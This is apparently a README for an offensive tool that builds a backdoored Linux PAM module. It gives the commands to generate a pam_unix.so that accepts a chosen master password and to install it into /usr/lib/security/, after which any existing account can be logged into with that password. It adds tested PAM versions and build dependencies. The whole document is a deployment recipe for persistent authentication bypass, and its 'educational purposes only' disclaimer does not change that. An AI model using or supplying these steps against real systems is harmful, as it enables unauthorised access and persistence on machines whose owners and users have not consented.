# linux-pam-backdoor         
Linux PAM Backdoor           
                             
This script automates the creation of a backdoor for Linux-PAM (Pluggable Authentication Modules)

## Usage
To generate the backdoored pam_unix.so, just run:
```
./backdoor.sh -v 1.5.0 -p som3_s3cr4t_p455w0rd
```

You have to identify the PAM version installed on the system, to make sure the script will compile the right version. Otherwise you can break the whole system authentication.

After the execution of the script, the last step is to copy the generated pam_unix.so to the pam modules dir on the host. 

```
cp pam_unix.so /usr/lib/security/
```

That's all. 

After that, you can log-in to the system using an existing user, and the previously configured password.

Use this for educational purposes only.
I am not responsible for the damage you might cause.

## Dependencies 

Tested with Ubuntu 21.10:
* 1.3.0 (And older version): Doesn't compile
* 1.4.0: Compiled successfully & Worked
* 1.5.0: Compiled successfully & Worked

The following packages where used
```bash
apt install -y  autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc
```
